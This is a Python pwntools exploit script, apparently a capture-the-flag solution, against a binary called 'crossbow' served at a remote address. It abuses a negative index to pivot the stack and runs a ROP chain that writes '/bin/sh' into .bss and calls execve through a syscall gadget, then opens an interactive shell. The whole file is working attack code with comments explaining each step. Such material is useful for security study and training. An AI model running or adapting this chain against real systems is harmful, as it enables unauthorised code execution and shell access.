#!/usr/bin/env python3

from pwn import *

exe = ELF("./crossbow")

context.binary = exe
gdb_script = '''
b *target_dummy
b *target_dummy+424
b *training+125
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r, gdb_script)
    else:
        r = remote("83.136.253.184", 32666)

    return r


def main():
    r = conn()

    rop = ROP(exe)

	# Address of .bss where we want to write "/bin/sh\x00"
    bss_addr = 0x40e220

	# ----------------------------------------------------------------------
	# Step 1: Write "/bin/sh\x00" into .bss using the gadget:
	#         "mov qword ptr [rdi], rax ; ret"
	# ----------------------------------------------------------------------

	# Prepare the 8-byte value for "/bin/sh\x00"
    binsh_value = u64(b"/bin/sh\x00")

	# We need to set rdi = bss_addr and rax = binsh_value.
	
	# Find a pop gadget for rdi:
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
	# Find a pop gadget for rax:
    pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
    
	# The given write gadget:
    rop.raw(p64(pop_rdi))
    rop.raw(p64(bss_addr))         # rdi = address in .bss
    rop.raw(p64(pop_rax))
    rop.raw(p64(binsh_value))        # rax = "/bin/sh\x00"
    rop.raw(p64(0x000000000040214f)) # mov bh, 1 ; mov qword ptr [rdi], rax ; ret

	# ----------------------------------------------------------------------
	# Step 2: Set up registers for execve("/bin/sh", NULL, NULL)
	#
	# execve syscall requirements (amd64):
	#   rdi = pointer to /bin/sh (our bss_addr)
	#   rsi = argv (NULL)
	#   rdx = envp (NULL)
	#   rax = 59 (execve syscall number)
	# ----------------------------------------------------------------------

    pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
    pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
	# Find a gadget to set rax:
    pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
	# Find the syscall gadget:
    syscall = rop.find_gadget(['syscall', 'ret'])[0]

    rop.raw(p64(pop_rdi))
    rop.raw(p64(bss_addr))         # rdi = pointer to "/bin/sh" in .bss
    rop.raw(p64(pop_rsi))
    rop.raw(p64(0))                # rsi = 0
    rop.raw(p64(pop_rdx))
    rop.raw(p64(0))                # rdx = 0
    rop.raw(p64(pop_rax))
    rop.raw(p64(59))               # rax = 59 (execve syscall)
    rop.raw(p64(syscall))  # syscall
    
    stack = 0x7ffff7ff8050
    rip_offset = -1
    rbp_offset = -2
    
    r.sendlineafter(b"Select target to shoot: ", str(rbp_offset).encode())
    log.info("Stack pivoting..")
    r.sendlineafter(b"> ", p64(stack) + rop.chain())

    r.interactive()


if __name__ == "__main__":
    main()

